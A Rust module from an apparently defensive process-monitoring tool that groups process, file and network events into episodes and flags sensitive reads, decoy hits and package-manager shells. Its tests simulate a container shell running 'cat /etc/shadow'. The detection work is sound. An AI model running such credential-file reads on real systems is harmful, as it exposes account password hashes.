//! Chain builder (SPEC §4.2): turns the event stream into episodes, one per process-tree root.

use std::{
    collections::{BTreeMap, BTreeSet, HashMap, HashSet},
    fs,
    path::Path,
};

use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::{
    config::Config,
    driver::{Driver, Kind},
    event::{Container, Data, Event},
    paths,
};

const ARGV_CAP: usize = 256;
const TREE_CAP: usize = 25;
const FILES_CAP: usize = 15;
const NET_CAP: usize = 15;
const TRAIL_CAP: usize = 100;
const TRIPWIRE_ROOM: usize = 20;
pub(crate) const SHELLS: &[&str] = &["bash", "sh", "zsh", "fish", "dash", "ksh", "nu"];
const PACKAGE_MANAGERS: &[&str] = &[
    "npm", "npx", "node", "pnpm", "yarn", "bun", "pip", "pip3", "uv", "cargo", "gem", "composer",
];

pub struct Proc {
    pub ppid: Option<u32>,
    pub exe: String,
    pub argv: Vec<String>,
    pub comm: String,
    pub uid: u32,
    /// Pid of this process's episode root.
    pub root: u32,
    /// Name of the ignore rule covering this process, if any.
    pub ignored: Option<String>,
    pub exited_ms: Option<u64>,
    /// Container the process runs in (None: the host, or unknown).
    pub container: Option<Container>,
    /// Who drives this process (`driver.rs`): inherited from its parent, replaced by what it is.
    pub driver: Driver,
}

pub struct TreeEntry {
    pub pid: u32,
    pub ppid: Option<u32>,
    pub ts_ms: u64,
    pub exe: String,
    pub argv: String,
    pub parent: String,
    execd: bool,
}

/// One step of an episode's audit trail: a process opened a categorized file or connected
/// somewhere. Kept in order with the process that did it; for people, not sent to the model.
pub struct TrailEntry {
    pub ts_ms: u64,
    pub pid: u32,
    pub what: Trail,
}

pub enum Trail {
    Open { path: String, category: &'static str, write: bool },
    Net { dest: String, new: bool, decoy: bool },
}

pub struct NetEntry {
    pub dest: String,
    pub by: String,
    pub new: bool,
}

pub struct Episode {
    pub id: String,
    pub root: u32,
    /// Container the episode ran in (None: the host, or unknown).
    pub container: Option<Container>,
    pub start_ms: u64,
    pub last_ms: u64,
    pub root_exe: String,
    pub root_argv: String,
    pub root_uid: u32,
    pub root_parent: String,
    /// Who drives the episode: the root's driver, or `agent` once an agent program runs in it.
    pub driver: Driver,
    pub tree: Vec<TreeEntry>,
    tree_pids: HashSet<u32>,
    pub tree_truncated: usize,
    pub files: BTreeMap<&'static str, BTreeSet<String>>,
    pub other_opens: u64,
    pub net: Vec<NetEntry>,
    /// Decoy addresses (`decoys.addresses`) this episode tried to reach. Kept apart from
    /// `net`, which stops at NET_CAP: a scan's decoy hit must not be lost behind the cap.
    pub decoy_net: BTreeSet<String>,
    pub trail: Vec<TrailEntry>,
    trail_seen: HashSet<(u32, String)>,
    pub trail_truncated: usize,
    pub flags: BTreeSet<String>,
    /// Something sensitive happened that was not a routine read (`routine` in dnom.yaml):
    /// a sensitive file opened by anything else, or a decoy.
    pub beyond_routine: bool,
    /// Bumped on every meaningful change; compared with `assessed_version`.
    pub version: u64,
    pub assessed_version: u64,
    pub first_unassessed_ms: Option<u64>,
    pub last_change_ms: u64,
}

impl Episode {
    /// Records a trail step once per process and target (a file read in a loop is one step).
    /// Tripwire steps (`always`) get room past the cap: they are what the reader looks for.
    fn push_trail(&mut self, ts_ms: u64, pid: u32, key: &str, what: Trail, always: bool) {
        if !self.trail_seen.insert((pid, key.to_string())) {
            return;
        }
        if self.trail.len() >= TRAIL_CAP + if always { TRIPWIRE_ROOM } else { 0 } {
            self.trail_truncated += 1;
            return;
        }
        self.trail.push(TrailEntry { ts_ms, pid, what });
    }

    fn mark_changed(&mut self, ts: u64) {
        self.version += 1;
        self.last_change_ms = ts;
        self.first_unassessed_ms.get_or_insert(ts);
    }

    pub fn sensitive_count(&self) -> usize {
        self.decoy_net.len()
            + self.files.iter().filter(|(cat, _)| paths::is_sensitive(cat)).map(|(_, set)| set.len()).sum::<usize>()
    }

    pub fn needs_assessment(&self) -> bool {
        self.version > self.assessed_version
    }

    /// True if everything sensitive in this episode is a daemon reading its own files, and
    /// the episode has contacted no new destination. Such an episode is not assessed for it.
    pub fn only_routine_reads(&self) -> bool {
        self.sensitive_count() > 0 && !self.beyond_routine && !self.flags.contains("new_destination")
    }

    /// Never assessed, and routine reads are the reason.
    fn left_as_routine(&self) -> bool {
        self.assessed_version == 0 && self.only_routine_reads()
    }

    /// Cheap pre-filter (SPEC §4.4): only these episodes reach the model.
    pub fn passes_prefilter(&self, assess_new_destinations: bool) -> bool {
        (self.sensitive_count() > 0 && !self.only_routine_reads())
            || self.flags.contains("new_exe")
            || self.flags.contains("shell_from_package_manager")
            || self.flags.contains("sensitive_in_ignored_tree")
            || (assess_new_destinations && self.flags.contains("new_destination"))
    }

    pub fn label(&self) -> String {
        basename(&self.root_exe).to_string()
    }

    /// Episode JSON in the SPEC §5 shape. Home paths are shortened to `~`.
    pub fn to_json(&self, home: &str) -> Value {
        let tidy = |s: &str| tidy_home(s, home);
        let files: BTreeMap<&str, Vec<String>> = self
            .files
            .iter()
            .map(|(cat, set)| (*cat, set.iter().map(|p| tidy(p)).collect()))
            .collect();
        let mut tree: Vec<Value> = self
            .tree
            .iter()
            .map(|t| {
                json!({ "pid": t.pid, "ppid": t.ppid, "ts_ms": t.ts_ms, "exe": tidy(&t.exe), "argv": tidy(&t.argv), "parent": t.parent })
            })
            .collect();
        let trail: Vec<Value> = self
            .trail
            .iter()
            .map(|t| match &t.what {
                Trail::Open { path, category, write } => {
                    json!({ "ts_ms": t.ts_ms, "pid": t.pid, "event": "open", "path": tidy(path), "category": category, "write": write })
                }
                Trail::Net { dest, new, decoy } => {
                    let mut step = json!({ "ts_ms": t.ts_ms, "pid": t.pid, "event": "net", "dest": dest, "new_destination": new });
                    if *decoy {
                        step["decoy"] = json!(true);
                    }
                    step
                }
            })
            .collect();
        if self.tree_truncated > 0 {
            tree.push(json!({ "more_processes_not_shown": self.tree_truncated }));
        }
        let mut v = json!({
            "episode_id": self.id,
            "window": { "start": rfc3339(self.start_ms), "end": rfc3339(self.last_ms) },
            "root": {
                "exe": tidy(&self.root_exe),
                "argv": tidy(&self.root_argv),
                "uid": self.root_uid,
                "started_by": self.root_parent,
            },
            "driver": self.driver.to_json(),
            "tree": tree,
            "files": files,
            "other_file_opens": self.other_opens,
            "network": self.net.iter().map(|n| json!({ "dest": n.dest, "by": n.by, "new_destination": n.new })).collect::<Vec<_>>(),
            "flags": self.flags,
            "trail": trail,
        });
        if self.trail_truncated > 0 {
            v["trail_truncated"] = json!(self.trail_truncated);
        }
        if !self.decoy_net.is_empty() {
            v["decoy_destinations"] = json!(self.decoy_net);
        }
        // Only when known, so host episodes look exactly as before. The container id is left
        // out: it means nothing to the model.
        if let Some(c) = &self.container {
            let mut m = serde_json::Map::new();
            for (k, val) in [("name", &c.name), ("image", &c.image), ("pod", &c.pod), ("namespace", &c.namespace)] {
                if let Some(val) = val {
                    m.insert(k.into(), json!(val));
                }
            }
            v["container"] = Value::Object(m);
        }
        v
    }
}

/// The episode as a model sees it: the full record without the parts kept for people.
/// - `files.decoys` and `files.dnom_config`: a tripwire file stays listed under its normal
///   category (or counted in `other_file_opens`), so the model's answers remain an
///   independent check on the alert.
/// - `decoy_destinations`: a decoy address stays in `network` like any other destination.
/// - the audit trail and the tree's `ppid` / `ts_ms`.
/// - `driver`: a label made from names the model already sees, kept as an independent check.
pub fn model_view(episode: &Value) -> Value {
    let mut v = episode.clone();
    if let Some(o) = v.as_object_mut() {
        o.remove("driver");
        o.remove("trail");
        o.remove("trail_truncated");
        o.remove("decoy_destinations");
    }
    if let Some(files) = v["files"].as_object_mut() {
        for kind in paths::TRIPWIRES {
            files.remove(kind);
        }
    }
    for t in v["tree"].as_array_mut().into_iter().flatten() {
        if let Some(o) = t.as_object_mut() {
            o.remove("ppid");
            o.remove("ts_ms");
        }
    }
    v
}

/// Things seen before on this machine (SPEC §4.2 local baseline).
#[derive(Default, Serialize, Deserialize)]
pub struct Baseline {
    exes: BTreeSet<String>,
    destinations: BTreeSet<String>,
}

impl Baseline {
    pub fn load(path: &Path) -> (Self, bool) {
        match fs::read_to_string(path) {
            Ok(text) => (serde_json::from_str(&text).unwrap_or_default(), true),
            Err(_) => (Self::default(), false),
        }
    }

    pub fn save(&self, path: &Path) -> anyhow::Result<()> {
        if let Some(dir) = path.parent() {
            fs::create_dir_all(dir)?;
        }
        let tmp = path.with_extension("json.tmp");
        fs::write(&tmp, serde_json::to_vec(self)?)?;
        fs::rename(tmp, path)?;
        Ok(())
    }

    pub fn len(&self) -> (usize, usize) {
        (self.exes.len(), self.destinations.len())
    }
}

pub struct Tracker {
    config: Config,
    own_pid: u32,
    procs: HashMap<u32, Proc>,
    parent_of: HashMap<u32, u32>,
    pub episodes: HashMap<u32, Episode>,
    pub baseline: Baseline,
    /// Until this time (Unix ms) the baseline only learns and raises no `new_*` flags.
    pub learn_until_ms: u64,
    /// This program's own path: dnom reading its config is not a tripwire.
    own_exe: Option<String>,
    decoy_addresses: crate::decoys::Addresses,
    /// Look up processes we haven't seen fork in this machine's /proc. Off when the events
    /// come from another machine (a VM), where these pids mean something else.
    local_proc: bool,
    /// Closed episodes that were never assessed because all they did was routine reads.
    routine_closed: u64,
}

impl Tracker {
    pub fn new(config: Config, baseline: Baseline, learn_until_ms: u64) -> Self {
        Self {
            // Checked when the config was loaded; a hand-built config with a bad entry has none.
            decoy_addresses: crate::decoys::Addresses::parse(&config.decoys.addresses).unwrap_or_default(),
            config,
            own_pid: std::process::id(),
            procs: HashMap::new(),
            parent_of: HashMap::new(),
            episodes: HashMap::new(),
            baseline,
            learn_until_ms,
            own_exe: std::env::current_exe().ok().map(|p| p.to_string_lossy().into_owned()),
            local_proc: true,
            routine_closed: 0,
        }
    }

    /// Events come from another machine: never read the local /proc, and don't drop events
    /// whose pid happens to equal this process's.
    pub fn remote(mut self) -> Self {
        self.local_proc = false;
        self.own_pid = 0;
        self.own_exe = None;
        self
    }

    /// The decoys generated for this run (replaced when they are rotated).
    pub fn set_generated_decoys(&mut self, paths: Vec<String>) {
        self.config.paths.generated = paths;
    }

    pub fn ingest(&mut self, ev: Event) {
        if ev.pid == self.own_pid {
            return;
        }
        match &ev.data {
            Data::Fork { child } => {
                if *child != ev.pid {
                    self.parent_of.insert(*child, ev.pid);
                }
                return;
            }
            Data::Exit {} => {
                if let Some(p) = self.procs.get_mut(&ev.pid) {
                    p.exited_ms = Some(ev.ts_ms);
                }
                self.parent_of.remove(&ev.pid);
                return;
            }
            _ => {}
        }

        self.ensure_proc(ev.pid, Some((&ev.comm, ev.uid, ev.container.as_ref())), 0);
        let learning = ev.ts_ms < self.learn_until_ms;
        if let Some(c) = &ev.container
            && let Some(p) = self.procs.get_mut(&ev.pid)
        {
            match &mut p.container {
                Some(pc) if pc.id == c.id => pc.fill_from(c),
                _ => p.container = Some(c.clone()),
            }
            if let Some(ep) = self.episodes.get_mut(&p.root) {
                match &mut ep.container {
                    Some(ec) => ec.fill_from(c),
                    None => ep.container = Some(c.clone()),
                }
            }
        }
        let ts = ev.ts_ms;

        // The kernel reports the real uid on every event, so it beats anything inferred
        // when the process was first seen (e.g. only through its parent's fork).
        if let Some(p) = self.procs.get_mut(&ev.pid) {
            p.uid = ev.uid;
            if p.root == ev.pid
                && let Some(ep) = self.episodes.get_mut(&ev.pid)
            {
                ep.root_uid = ev.uid;
            }
        }

        match ev.data {
            Data::Exec { exe, argv } => self.on_exec(ev.pid, ev.comm, exe, argv, ts, learning),
            Data::Open { path, write, .. } => self.on_open(ev.pid, path, write, ts),
            Data::Net { dest, .. } => self.on_net(ev.pid, dest, ts, learning),
            Data::Fork { .. } | Data::Exit {} => {}
        }
    }

    fn on_exec(&mut self, pid: u32, comm: String, exe: String, argv: Vec<String>, ts: u64, learning: bool) {
        let argv_joined = argv.join(" ");
        let rule = self
            .config
            .ignore
            .iter()
            .find(|r| r.matches(&exe, &comm, &argv_joined))
            .map(|r| r.name.clone());
        let parent_name = self.parent_name(pid);
        let parent_names = self
            .procs
            .get(&pid)
            .and_then(|p| p.ppid)
            .and_then(|pp| self.procs.get(&pp))
            .map(|pp| (pp.comm.clone(), pp.exe.clone()));
        let Some(p) = self.procs.get_mut(&pid) else { return };
        let ppid = p.ppid;
        p.exe = exe.clone();
        p.argv = argv.clone();
        p.comm = comm.clone();
        // The program it runs now can change who drives it: a shell in a terminal, an agent.
        p.driver = self.config.drivers.of(
            &p.driver,
            &comm,
            &exe,
            is_interactive_shell(&comm, &argv),
            parent_names.as_ref().map(|(c, e)| (c.as_str(), e.as_str())),
        );
        let driver = p.driver.clone();
        if p.ignored.is_none() {
            p.ignored = rule;
        }
        if p.ignored.is_some() {
            return;
        }
        let root = p.root;

        let is_new_exe = !self.baseline.exes.contains(&exe);
        if is_new_exe {
            self.baseline.exes.insert(exe.clone());
        }
        let shell_from_pm = SHELLS.contains(&comm.as_str())
            && PACKAGE_MANAGERS.contains(&parent_name.as_str());

        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        // Ignore rules match the raw command line (it stays local); episodes store it redacted.
        let shown_argv = self.config.redact.redact_argv(&argv);
        if pid == root {
            // The root's exec defines what the episode is (a forked shell child that runs curl).
            ep.root_exe = exe.clone();
            ep.root_argv = cap(&shown_argv);
        }
        // An agent program anywhere in the tree makes it an agent's episode.
        if pid == root || (driver.kind == Kind::Agent && ep.driver.kind != Kind::Agent) {
            ep.driver = driver;
        }
        push_tree(ep, pid, ppid, ts, &exe, &shown_argv, &parent_name, true);
        if is_new_exe && !learning {
            ep.flags.insert("new_exe".into());
        }
        if shell_from_pm {
            ep.flags.insert("shell_from_package_manager".into());
        }
        ep.mark_changed(ts);
    }

    fn on_open(&mut self, pid: u32, path: String, write: bool, ts: u64) {
        if path.is_empty() {
            return;
        }
        // `dnom collect` resolves relative paths when the event arrives. One that is still
        // relative here couldn't be resolved: match patterns against it, show it as `?/path`.
        let (path, category) = if path.starts_with('/') {
            let category = self.config.paths.categorize(&path, write);
            (path, category)
        } else {
            let category = self.config.paths.categorize(&format!("/{path}"), write);
            (format!("?/{path}"), category)
        };
        let Some(p) = self.procs.get(&pid) else { return };
        // A decoy, or dnom's config opened by anything but dnom itself (another `dnom classify`
        // reads it too).
        let tripwire = self
            .config
            .paths
            .tripwire(&path)
            .filter(|t| *t != paths::OWN_CONFIG || self.own_exe.as_deref() != Some(p.exe.as_str()));
        let sensitive = tripwire.is_some() || category.is_some_and(paths::is_sensitive);
        // A daemon reading its own files: kept in the record, but not a signal. Never a write,
        // a tripwire, or a process in a container (its root can replace the container's programs).
        let routine = sensitive
            && !write
            && tripwire.is_none()
            && p.container.is_none()
            && self.config.routine.covers(&p.exe, &path);
        let ignored = p.ignored.clone();
        if ignored.is_some() && (!sensitive || routine) {
            return;
        }
        let root = p.root;
        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        if ignored.is_some() {
            ep.flags.insert("sensitive_in_ignored_tree".into());
        }
        if sensitive && !routine {
            ep.beyond_routine = true;
        }
        // A tripwire file is listed as one and also under its normal category, like any other.
        if let Some(kind) = tripwire {
            ep.push_trail(ts, pid, &path, Trail::Open { path: path.clone(), category: kind, write }, true);
            let set = ep.files.entry(kind).or_default();
            if set.len() < FILES_CAP && set.insert(path.clone()) {
                ep.mark_changed(ts);
            }
        }
        match category {
            Some(cat) => {
                if tripwire.is_none() && paths::is_sensitive(cat) {
                    ep.push_trail(ts, pid, &path, Trail::Open { path: path.clone(), category: cat, write }, false);
                }
                let set = ep.files.entry(cat).or_default();
                if set.len() < FILES_CAP && set.insert(path) && sensitive {
                    ep.mark_changed(ts);
                }
            }
            None => ep.other_opens += 1,
        }
    }

    fn on_net(&mut self, pid: u32, dest: String, ts: u64, learning: bool) {
        let Some(p) = self.procs.get(&pid) else { return };
        // An attempt to reach a decoy address counts wherever it comes from, like a decoy file.
        let decoy = self.decoy_addresses.matches(&dest);
        let ignored = p.ignored.is_some();
        if ignored && !decoy {
            return;
        }
        let root = p.root;
        let by = basename(&p.exe).to_string();
        // This machine's own unspecified and loopback addresses are not destinations
        // (sshd connects to 0.0.0.0:22 and [::]:22 during every login).
        let is_new = !is_local_dest(&dest)
            && self.baseline.destinations.insert(format!("{} {}", p.exe, dest))
            && !learning;
        self.ensure_episode(root, ts);
        let ep = self.episodes.get_mut(&root).expect("episode just ensured");
        ep.last_ms = ep.last_ms.max(ts);
        ep.push_trail(ts, pid, &dest, Trail::Net { dest: dest.clone(), new: is_new, decoy }, decoy);
        if ignored {
            ep.flags.insert("sensitive_in_ignored_tree".into());
        }
        if decoy {
            ep.beyond_routine = true;
        }
        if decoy && ep.decoy_net.len() < NET_CAP && ep.decoy_net.insert(dest.clone()) {
            ep.mark_changed(ts);
        }
        if ep.net.iter().any(|n| n.dest == dest && n.by == by) {
            return;
        }
        if ep.net.len() < NET_CAP {
            ep.net.push(NetEntry { dest, by, new: is_new });
            if is_new {
                ep.flags.insert("new_destination".into());
            }
            ep.mark_changed(ts);
        }
    }

    /// Makes sure `pid` (and its ancestors) are in the process table.
    /// `seen` carries comm/uid from the event when the pid was never seen before.
    fn ensure_proc(&mut self, pid: u32, seen: Option<(&str, u32, Option<&Container>)>, depth: u32) {
        if self.procs.contains_key(&pid) {
            return;
        }
        // Forked since dnom started: we know the parent from the fork event. Otherwise /proc.
        let forked_from = self.parent_of.get(&pid).copied();
        let proc_info = if forked_from.is_some() || !self.local_proc { None } else { read_proc(pid) };
        let seen_ppid = forked_from.or(proc_info.as_ref().and_then(|i| i.ppid));
        let ppid = seen_ppid.filter(|&pp| pp > 1 && pp != pid);
        if let Some(pp) = ppid
            && depth < 64
        {
            self.ensure_proc(pp, None, depth + 1);
        }
        let parent = ppid.and_then(|pp| self.procs.get(&pp));

        // A forked child that hasn't exec'd yet is still running its parent's program.
        let (exe, argv, mut comm, ignored) = match (&proc_info, parent) {
            (Some(info), parent) => (
                info.exe.clone(),
                info.argv.clone(),
                info.comm.clone(),
                parent.and_then(|p| p.ignored.clone()),
            ),
            (None, Some(parent)) => (
                parent.exe.clone(),
                parent.argv.clone(),
                parent.comm.clone(),
                parent.ignored.clone(),
            ),
            (None, None) => (String::new(), Vec::new(), String::new(), None),
        };
        if let Some((c, _, _)) = seen
            && !c.is_empty()
        {
            comm = c.to_string();
        }
        // A forked child runs as its parent until it changes credentials. Defaulting to 0
        // here used to make plain user shells look like root.
        let uid = seen
            .map(|(_, u, _)| u)
            .or(proc_info.as_ref().map(|i| i.uid))
            .or(parent.map(|p| p.uid))
            .unwrap_or(0);

        let container = seen.and_then(|(_, _, c)| c.cloned());
        // Entering a container (runc / containerd-shim on the host starts the container's first
        // process) starts a new episode: what runs in a container is its own story.
        let enters_container = container.as_ref().is_some_and(|c| {
            parent.is_some_and(|p| p.container.as_ref().map(|pc| &pc.id) != Some(&c.id))
        });
        let container = container.or_else(|| parent.and_then(|p| p.container.clone()));
        let root = match parent {
            Some(parent) if !enters_container && !self.starts_episode_below(parent) => parent.root,
            _ => pid,
        };
        let ignored = ignored.or_else(|| {
            let argv_joined = argv.join(" ");
            self.config
                .ignore
                .iter()
                .find(|r| r.matches(&exe, &comm, &argv_joined))
                .map(|r| r.name.clone())
        });
        // A child of pid 1 is a system service (or an orphan that was handed to it).
        let inherited = match parent {
            Some(parent) => parent.driver.clone(),
            None if seen_ppid == Some(1) => Driver::from_init(),
            None => Driver::default(),
        };
        let driver = self.config.drivers.of(
            &inherited,
            &comm,
            &exe,
            is_interactive_shell(&comm, &argv),
            parent.map(|p| (p.comm.as_str(), p.exe.as_str())),
        );
        self.procs.insert(
            pid,
            Proc { ppid, exe, argv, comm, uid, root, ignored, exited_ms: None, container, driver },
        );
    }

    /// True if the children of `parent` should each start their own episode.
    fn starts_episode_below(&self, parent: &Proc) -> bool {
        if self.is_boundary(parent) {
            return true;
        }
        // An interactive shell: a shell started directly by a terminal, sshd, tmux, ...
        // Each command typed in it is its own episode. A shell running a script or `-c`
        // (e.g. `ssh host 'cd x && ./script.sh'`, which bash may exec into the script under
        // the same pid) is not interactive: everything it starts belongs to one episode.
        SHELLS.contains(&parent.comm.as_str())
            && is_interactive_shell_argv(&parent.argv)
            && parent
                .ppid
                .and_then(|g| self.procs.get(&g))
                .is_some_and(|g| self.is_boundary(g))
    }

    fn is_boundary(&self, p: &Proc) -> bool {
        let base = basename(&p.exe);
        self.config.boundaries.iter().any(|b| *b == p.comm || *b == base)
    }

    fn parent_name(&self, pid: u32) -> String {
        self.procs
            .get(&pid)
            .and_then(|p| p.ppid)
            .and_then(|pp| self.procs.get(&pp))
            .map(|pp| pp.comm.clone())
            .unwrap_or_default()
    }

    fn ensure_episode(&mut self, root: u32, ts: u64) {
        if self.episodes.contains_key(&root) {
            return;
        }
        let parent_name = self.parent_name(root);
        let (exe, argv, uid, container, ppid, driver) = self
            .procs
            .get(&root)
            .map(|p| (p.exe.clone(), self.config.redact.redact_argv(&p.argv), p.uid, p.container.clone(), p.ppid, p.driver.clone()))
            .unwrap_or_default();
        let mut ep = Episode {
            id: format!("ep-{root}-{:05x}", ts & 0xfffff),
            root,
            container,
            start_ms: ts,
            last_ms: ts,
            root_exe: exe.clone(),
            root_argv: cap(&argv),
            root_uid: uid,
            root_parent: parent_name.clone(),
            driver,
            tree: Vec::new(),
            tree_pids: HashSet::new(),
            tree_truncated: 0,
            files: BTreeMap::new(),
            other_opens: 0,
            net: Vec::new(),
            decoy_net: BTreeSet::new(),
            trail: Vec::new(),
            trail_seen: HashSet::new(),
            trail_truncated: 0,
            flags: BTreeSet::new(),
            beyond_routine: false,
            version: 0,
            assessed_version: 0,
            first_unassessed_ms: None,
            last_change_ms: ts,
        };
        push_tree(&mut ep, root, ppid, ts, &exe, &argv, &parent_name, false);
        self.episodes.insert(root, ep);
    }

    /// Episodes so far, closed or still open, that were not assessed because all they did
    /// was routine reads.
    pub fn routine_episodes(&self) -> u64 {
        self.routine_closed + self.episodes.values().filter(|ep| ep.left_as_routine()).count() as u64
    }

    /// Closes idle or old episodes and forgets processes that exited a while ago.
    pub fn gc(&mut self, now_ms: u64, idle_ms: u64, max_life_ms: u64) -> usize {
        let before = self.episodes.len();
        let mut routine = 0;
        self.episodes.retain(|_, ep| {
            let keep = now_ms.saturating_sub(ep.last_ms) < idle_ms
                && now_ms.saturating_sub(ep.start_ms) < max_life_ms;
            if !keep && ep.left_as_routine() {
                routine += 1;
            }
            keep
        });
        self.routine_closed += routine;
        self.procs
            .retain(|_, p| p.exited_ms.is_none_or(|t| now_ms.saturating_sub(t) < 30_000));
        if self.parent_of.len() > 200_000 {
            self.parent_of.clear();
        }
        before - self.episodes.len()
    }
}

/// Adds a tree entry. An exec replaces the pid's entry if that entry was only a placeholder
/// (the process seen before its exec) and otherwise appends, so exec chains stay visible.
#[allow(clippy::too_many_arguments)]
fn push_tree(ep: &mut Episode, pid: u32, ppid: Option<u32>, ts_ms: u64, exe: &str, argv: &str, parent: &str, execd: bool) {
    let first_time = ep.tree_pids.insert(pid);
    if let Some(last) = ep.tree.iter_mut().rev().find(|t| t.pid == pid) {
        if last.exe == exe && last.argv == cap(argv) {
            last.execd |= execd;
            return;
        }
        if !last.execd && execd {
            last.exe = exe.to_string();
            last.argv = cap(argv);
            last.execd = true;
            last.ts_ms = ts_ms;
            return;
        }
    }
    if ep.tree.len() >= TREE_CAP {
        if first_time {
            ep.tree_truncated += 1;
        }
        return;
    }
    ep.tree.push(TreeEntry {
        pid,
        ppid,
        ts_ms,
        exe: exe.to_string(),
        argv: cap(argv),
        parent: parent.to_string(),
        execd,
    });
}

struct ProcInfo {
    ppid: Option<u32>,
    comm: String,
    uid: u32,
    exe: String,
    argv: Vec<String>,
}

/// Fallback for processes that started before dnom: read /proc (racy for short-lived ones).
fn read_proc(pid: u32) -> Option<ProcInfo> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let open = stat.find('(')?;
    let close = stat.rfind(')')?;
    let comm = stat[open + 1..close].to_string();
    let mut fields = stat[close + 1..].split_whitespace();
    let _state = fields.next();
    let ppid = fields.next().and_then(|f| f.parse().ok());
    let argv: Vec<String> = fs::read(format!("/proc/{pid}/cmdline"))
        .map(|raw| {
            raw.split(|&b| b == 0)
                .filter(|a| !a.is_empty())
                .map(|a| String::from_utf8_lossy(a).into_owned())
                .collect()
        })
        .unwrap_or_default();
    let exe = fs::read_link(format!("/proc/{pid}/exe"))
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| argv.first().cloned().unwrap_or_default());
    let uid = fs::read_to_string(format!("/proc/{pid}/status"))
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("Uid:"))
                .and_then(|l| l.split_whitespace().nth(1))
                .and_then(|u| u.parse().ok())
        })
        .unwrap_or(0);
    Some(ProcInfo { ppid, comm, uid, exe, argv })
}

/// True for `ip:port` / `[ip]:port` destinations on this machine itself: unspecified
/// (0.0.0.0, ::) or loopback (127.0.0.0/8, ::1).
fn is_local_dest(dest: &str) -> bool {
    dest.parse::<std::net::SocketAddr>()
        .is_ok_and(|a| a.ip().is_unspecified() || a.ip().is_loopback())
}

/// True if a shell's arguments look like an interactive session: only options, and no
/// `-c` (alone or in a cluster like `-lc`). A plain argument is a script to run.
/// Unknown argv (process seen only through events) counts as interactive.
pub(crate) fn is_interactive_shell_argv(argv: &[String]) -> bool {
    argv.iter().skip(1).all(|a| {
        if let Some(long) = a.strip_prefix("--") {
            long != "command"
        } else if let Some(short) = a.strip_prefix('-') {
            !short.is_empty() && !short.contains('c')
        } else {
            false
        }
    })
}

/// A shell that waits for typed commands (see `is_interactive_shell_argv`).
fn is_interactive_shell(comm: &str, argv: &[String]) -> bool {
    SHELLS.contains(&comm) && is_interactive_shell_argv(argv)
}

pub fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// SPEC §5 input hygiene: argv capped at 256 characters.
fn cap(s: &str) -> String {
    if s.chars().count() <= ARGV_CAP {
        s.to_string()
    } else {
        let mut out: String = s.chars().take(ARGV_CAP).collect();
        out.push('…');
        out
    }
}

fn tidy_home(s: &str, home: &str) -> String {
    if home.len() > 1 {
        s.replace(&format!("{home}/"), "~/")
    } else {
        s.to_string()
    }
}

pub fn rfc3339(ms: u64) -> String {
    let t = std::time::UNIX_EPOCH + std::time::Duration::from_millis(ms);
    humantime::format_rfc3339_seconds(t).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::{Data, Event};

    fn ev(ts: u64, pid: u32, uid: u32, comm: &str, data: Data) -> Event {
        Event { ts_ms: ts, pid, tid: pid, uid, comm: comm.into(), cgroup: 1, container: None, data }
    }

    fn in_container(mut e: Event, name: &str, ns: Option<&str>) -> Event {
        e.container = Some(Container {
            id: format!("id-{name}"),
            name: Some(name.into()),
            image: Some("nginx:1.27".into()),
            pod: ns.map(|_| format!("{name}-7f9c")),
            namespace: ns.map(String::from),
        });
        e
    }

    /// containerd-shim (host) starts nginx in a container; nginx starts a shell. The container
    /// is its own episode, labelled with the container, and everything inside stays in it.
    #[test]
    fn container_starts_its_own_labelled_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (shim, nginx, sh, cat) = (4_190_301, 4_190_302, 4_190_303, 4_190_304);
        t.ingest(ev(0, shim, 0, "containerd-shim", exec("/usr/bin/containerd-shim-runc-v2", &["containerd-shim-runc-v2"])));
        t.ingest(ev(1, shim, 0, "containerd-shim", Data::Fork { child: nginx }));
        t.ingest(in_container(ev(2, nginx, 0, "nginx", exec("/usr/sbin/nginx", &["nginx", "-g", "daemon off;"])), "web", Some("prod")));
        t.ingest(ev(3, nginx, 0, "nginx", Data::Fork { child: sh }));
        t.ingest(in_container(ev(4, sh, 0, "sh", exec("/bin/sh", &["sh", "-c", "cat /etc/shadow"])), "web", Some("prod")));
        t.ingest(ev(5, sh, 0, "sh", Data::Fork { child: cat }));
        t.ingest(in_container(ev(6, cat, 0, "cat", exec("/bin/cat", &["cat", "/etc/shadow"])), "web", Some("prod")));
        t.ingest(in_container(ev(7, cat, 0, "cat", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }), "web", Some("prod")));

        assert!(t.episodes.contains_key(&nginx), "entering the container starts an episode");
        assert!(!t.episodes.contains_key(&sh) && !t.episodes.contains_key(&cat), "inside the container: same episode");
        let json = t.episodes[&nginx].to_json("/root");
        assert_eq!(json["container"], json!({ "name": "web", "image": "nginx:1.27", "pod": "web-7f9c", "namespace": "prod" }));
        assert_eq!(json["files"]["credentials"][0], "/etc/shadow");
        // Host episodes carry no container block.
        assert!(t.episodes[&shim].to_json("/root").get("container").is_none());
    }

    /// Falco's first events from a new pod can carry only the container id (metadata is looked
    /// up asynchronously); the name and pod on later events must still label the episode.
    #[test]
    fn container_metadata_arriving_late_labels_the_episode() {
        let mut t = Tracker::new(Config::default(), Baseline::default(), 0).remote();
        let (shim, sh) = (4_190_401, 4_190_402);
        t.ingest(ev(0, shim, 0, "containerd-shim", exec("/usr/bin/containerd-shim-runc-v2", &["containerd-shim-runc-v2"])));
        t.ingest(ev(1, shim, 0, "containerd-shim", Data::Fork { child: sh }));
        let mut bare = ev(2, sh, 0, "sh", exec("/bin/sh", &["sh", "-c", "cat /etc/shadow"]));
        bare.container = Some(Container { id: "id-web".into(), name: None, image: None, pod: None, namespace: None });
        t.ingest(bare);
        t.ingest(in_container(ev(3, sh, 0, "sh", Data::Open { path: "/etc/shadow".into(), flags: 0, write: false }), "web", Some("prod")));

        let json = t.episodes[&sh].to_json("/root");
        assert_eq!(json["container"], json!({ "name": "web", "image": "nginx:1.27", "pod": "web-7f9c", "namespace": "prod" }));
